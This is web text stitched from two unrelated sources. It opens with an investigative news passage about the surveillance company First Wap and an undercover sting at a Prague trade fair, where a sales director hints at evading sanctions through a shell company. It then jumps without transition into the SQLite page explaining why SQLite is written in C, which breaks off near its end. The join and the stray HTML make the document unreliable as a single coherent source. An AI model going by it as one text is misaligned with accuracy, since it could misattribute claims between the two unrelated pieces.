<p>Since then, the company has quietly built a globe-spanning phone tracking empire, operating in the shadows, without any apparent red lines. It has also expanded its surveillance arsenal, adding features to Altamides that allow it to intercept SMS messages, listen in on phone calls, and even breach encrypted messaging apps like WhatsApp.</p>
<h2 id="we-can-find-a-way">“We can find a way”</h2>
<p>Our initial reporting surfaced dozens of non-criminal people surveilled without their knowledge by the company. Data, sources we spoke to and documents we examined indicated that Altamides had been used by authoritarian governments and, without lawful basis, by non-governmental clients. We decided it would be in the public interest to carry out an undercover operation to better understand what red lines the company placed around use of its products.</p>
<p>In a statement, First Wap insisted to us that it “vets and verifies any government client/final user for sanctions compliance prior to the signature of any agreement” and that “there has never been any exception to this.”</p>
<p>Testing the red lines required a fake character, complete with a fake company name and LinkedIn. One of Lighthouse’s reporters became Albert, a South Africa-based businessman who runs a boutique “research consultancy” registered in the British Virgin Islands. Accompanying him was Abdou, a colleague, who would be playing a mover and shaker with political connections throughout West Africa. They signed up for ISS World in the Czech Republic, the largest annual surveillance technology fair, to pitch some projects and see how the company responded.</p>
<p>So this June, our reporter found himself in a Prague hotel room, straightening a suit jacket outfitted with a hidden camera.</p>
<p>Albert and Abdou met First Wap’s sales director Günther Rudolph at the company’s booth, to discuss a series of business propositions. Could First Wap help a government monitor opponents abroad? Could the company crack encrypted WhatsApp chats? Could it help the owner of a mining company disrupt protests by environmental activists? “He knows already who are the leaders, or he wants to find out?” asked Rudolph.</p>
<p>Rudolph drew the undercover reporters’ attention to a potential snag: some of the people they propose selling to might be under sanction from the EU or US, meaning that European nationals like First Wap’s executives risked imprisonment if it were known they organised the sale. “That’s why when we make such a deal we make it through Jakarta,” Rudolph said, referring to First Wap’s corporate base in Indonesia. It was a “grey area”, he said. But “we can find a way”. What this way might look like became clear the following day: using a newly invented shell company to mask the connection in the papertrail between First Wap and the sanctioned client.</p>
<p>When confronted with our undercover operation in Prague, the company said that “misunderstandings evidently arose” and that the statements by its executives referred merely to technical feasibility.</p>

Why Is SQLite Coded In C
</p>

<h2 id="c_is_best"><span>1. </span>C Is Best</h2>

<blockquote><p>
Note: Sections 2.0 and 3.0 of this article were added in response
to comments on 
<a href="https://news.ycombinator.com/item?id=16585120">Hacker News</a> and

</p></blockquote>

<p>
Since its inception on 2000-05-29, SQLite has been implemented in generic C.
C was and continues to be the best language for implementing a software
library like SQLite.  There are no plans to recode SQLite in any other
programming language at this time.

</p><p>
The reasons why C is the best language to implement SQLite include:


</p><ul>
<li> Performance
</li><li> Compatibility
</li><li> Low-dependency
</li><li> Stability
</li></ul>

<h2 id="performance"><span>1.1. </span>Performance</h2>

<p>An intensively used low-level library like SQLite needs to be fast.
(And SQLite is fast, see <a href="https://www.sqlite.org/intern-v-extern-blob.html">Internal Versus External BLOBs</a> and
<a href="https://www.sqlite.org/fasterthanfs.html">35% Faster Than The Filesystem</a> for examples.)

</p><p>C is a great language for writing fast code.  C is sometimes
described as "portable assembly language".  It enables developers
to code as close to the underlying hardware as possible while still
remaining portable across platforms.

</p><p>Other programming languages sometimes claim to be "as fast as C".
But no other language claims to be faster than C for general-purpose
programming, because none are.

</p><h2 id="compatibility"><span>1.2. </span>Compatibility</h2>

<p>Nearly all systems have the ability to call libraries
written in C.  This is not true of other implementation languages.

</p><p>So, for example, Android applications written in Java are able to
invoke SQLite (through an adaptor).  Maybe it would have been more
convenient for Android if SQLite had been coded in Java as that would
make the interface simpler.  However, on iPhone applications are coded
in Objective-C or Swift, neither of which have the ability to call
libraries written in Java.  Thus, SQLite would be unusable on iPhones
had it been written in Java.

</p><h2 id="low_dependency"><span>1.3. </span>Low-Dependency</h2>

<p>Libraries written in C do not have a huge run-time dependency.
In its minimum configuration, SQLite requires only the following
routines from the standard C library:

</p><center>
<table>
<tbody><tr>
<td>
<ul>
<li> memcmp()
</li><li> memcpy()
</li><li> memmove()
</li><li> memset()
</li></ul>
</td>
<td>&nbsp;&nbsp;&nbsp;</td>
<td>
<ul>
<li> strcmp()
</li><li> strlen()
</li><li> strncmp()
</li></ul>
</td>
</tr>
</tbody></table>
</center>

<p>
In a more complete build, SQLite also uses library routines like
malloc() and free() and operating system interfaces for opening, reading,
writing, and closing files.  But even then, the number of dependencies
is very small.  Other "modern" languages, in contrast, often require
multi-megabyte runtimes loaded with thousands and thousands of interfaces.

</p><h2 id="stability"><span>1.4. </span>Stability</h2>

<p>
The C language is old and boring.
It is a well-known and well-understood language.
This is exactly what one wants when developing a module like SQLite.
Writing a small, fast, and reliable database engine is hard enough as it
is without the implementation language changing out from under you with
each update to the implementation language specification.

</p><h2 id="why_isn_t_sqlite_coded_in_an_object_oriented_language_"><span>2. </span>Why Isn't SQLite Coded In An Object-Oriented Language?</h2>

<p>
Some programmers cannot imagine developing a complex system like
SQLite in a language that is not "object oriented".  So why is
SQLite not coded in C++ or Java?

</p><ol>
<li><p>
Libraries written in C++ or Java can generally only be used by
applications written in the same language. It is difficult to
get an application written in Haskell or Java to invoke a library
written in C++.  On the other hand, libraries written in C are
callable from any programming language.

</p></li><li><p>
Object-Oriented is a design pattern, not a programming language.
You can do object-oriented programming in any language you want,
including assembly language.  Some languages (ex: C++ or Java) make
object-oriented easier.  But you can still do object-oriented programming
in languages like C.

</p></li><li><p>
Object-oriented is not the only valid design pattern.
Many programmers have been taught to think purely in terms of
objects.  And, to be fair, objects are often a good way to
decompose a problem.  But objects are not the only way, and are
not always the best way to decompose a problem.  Sometimes good old
procedural code is easier to write, easier to maintain and understand,
and faster than object-oriented code.

</p></li><li><p>
When SQLite was first being developed, Java was a young and immature
language.  C++ was older, but was undergoing such growing pains that
it was difficult to find any two C++ compilers that worked the same
way.  So C was definitely a better choice back when SQLite was first
being developed.  The situation is less stark now, but there is little
to no benefit in recoding SQLite at this point.
</p></li></ol>

<h2 id="why_isn_t_sqlite_coded_in_a_safe_language_"><span>3. </span>Why Isn't SQLite Coded In A "Safe" Language?</h2>

<p>
There has lately been a lot of interest in "safe" programming languages
like Rust or Go in which it is impossible, or is at least difficult, to make
common programming errors like memory leaks or array overruns.  So the
question often arises as to why SQLite is not coded in a "safe" language.

</p><ol>
<li><p>
None of the safe programming languages existed for the first 10 years
of SQLite's existence.  SQLite could be recoded in Go or Rust, but doing
so would probably introduce far more bugs than would be fixed, and it
may also result in slower code.

</p></li><li><p>
Safe languages insert additional machine branches to do things like
verify that array accesses are in-bounds.  In correct code, those
branches are never taken.  That means that the machine code cannot
be 100% branch tested, which is an important component of SQLite's
quality strategy.

</p></li><li><p>
Safe languages usually want to abort if they encounter an out-of-memory
(OOM) situation.  SQLite is designed to recover gracefully from an OOM.
It is unclear how this could be accomplished in the current crop of
safe languages.

</p></li><li><p>
All of the existing safe languages are new.  The developers of SQLite
applaud the efforts of computer language researchers in trying to
develop languages that are easier to program safely.  We encourage these
efforts to continue.  But we ourselves are more interested in old and
boring languages when it comes to implementing SQLite.
</p></li></ol>

<p>
All that said, it is possible that SQLite might
one day be recoded in Rust.  Recoding SQLite in Go is unlikely
since Go hates assert().  But Rust is a possibility.  Some
preconditions that must occur before SQLite is recoded in Rust
include:

</p><ol type="A">
<li> Rust needs to mature a little more, stop changing so fast, and
     move further toward being old and boring.
</li><li> Rust needs to demonstrate that it can be used to create general-purpose
     libraries that are callable from all other programming languages.
</li><li> Rust needs to demonstrate that it can produce object code that
     works on obscure embedded devices, including devices that lack
     an operating system.
</li><li> Rust needs to pick up the necessary tooling that enables one to
     do 100% branch coverage testing of the compiled binaries.
</li><li> Rust needs a mechanism to recover gracefully from OOM errors.
</li><li> Rust needs to demonstrate that it can do the kinds of work that
     C does in SQLite without a significant speed penalty.
</li></ol>

<p>
If you are a "rustacean" and feel that Rust already meets the
preconditions listed above, and that SQLite should be recoded in
Rust, then you are welcomed and encouraged
to contact the SQLite developers privately
and argue your case.
